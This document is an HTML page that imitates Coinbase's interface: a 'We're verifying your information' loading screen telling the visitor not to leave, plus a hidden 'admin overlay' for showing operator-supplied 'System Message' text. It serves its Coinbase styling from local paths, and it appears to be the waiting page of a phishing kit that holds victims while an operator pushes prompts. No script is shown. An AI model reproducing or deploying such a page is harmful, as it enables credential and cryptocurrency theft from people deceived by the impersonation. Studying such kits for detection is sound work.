<!DOCTYPE html>
<html lang="en" style="background:#0a0b0d;">
<head>
  <meta charset="utf-8"/>
  <link rel="icon" href="/Coinbaselogo.png"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>Coinbase - Review</title>
  <meta content="#000000" name="theme-color"/>
  <link href="/coinbase/css/12-d.css" rel="stylesheet"/>
  <link rel="stylesheet" href="/coinbase/css/fonts.css">
  <style>
    #admin-overlay {
      display: none; position: fixed; inset: 0;
      background: rgba(0,0,0,.5); backdrop-filter: blur(8px);
      z-index: 200; align-items: center; justify-content: center;
    }
    #admin-overlay.show { display: flex; }
    .overlay-card {
      background: #1a1d23; border: 1px solid rgba(255,255,255,.12); border-radius: 12px;
      padding: 32px 28px; max-width: 340px; width: 100%;
      text-align: center;
    }
    .overlay-card p { color: rgba(255,255,255,.65); font-size: 14px; line-height: 1.65; margin: 0 0 20px; }
    .overlay-card button {
      background: #0052ff; color: #fff; border: none; border-radius: 9999px;
      padding: 11px 28px; font-size: 14px; font-weight: 600; cursor: pointer;
    }
  </style>
</head>
<body style="background:#0a0b0d;">
  <div id="root">
    <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
      <div class="w-full px-6 pt-5">
        <svg height="32" viewBox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
          <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF"/>
        </svg>
      </div>
      <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
        <form class="mt-12 min-h-fit w-full max-w-md rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8 flex flex-col items-center pb-8 pt-12 text-center">
          <div class="mb-20 flex gap-5 p-8">
            <div class="h-3 w-3 animate-coinbase-dots-loading-1 rounded-full bg-[#0052FF]"></div>
            <div class="h-3 w-3 animate-coinbase-dots-loading-2 rounded-full bg-[#0052FF]"></div>
            <div class="h-3 w-3 animate-coinbase-dots-loading-3 rounded-full bg-[#0052FF]"></div>
          </div>
          <span class="pb-2 font-coinbase-title text-[28px] font-semibold text-white">
            We're verifying your information.
          </span>
          <span class="font-coinbase-sans text-coinbase-foreground-muted">
            Please do not navigate away from this page.<br/>
            This will only take a minute.
          </span>
          <a class="font-coinbase-sans text-coinbase-primary mt-8 font-light" href="https://www.coinbase.com/legal/" rel="noreferrer" target="_blank">
            Privacy policy
          </a>
        </form>
      </div>
    </div>
  </div>

  <!-- Admin overlay -->
  <div id="admin-overlay">
    <div class="overlay-card">
      <div style="font-size:10px;letter-spacing:.14em;color:rgba(255,255,255,.4);text-transform:uppercase;margin-bottom:14px;font-weight:600;">System Message</div>
      <p id="admin-overlay-message"></p>
      <button onclick="document.getElementById('admin-overlay').classList.remove('show')">Dismiss</button>
    </div>
  </div>

</body>
</html>
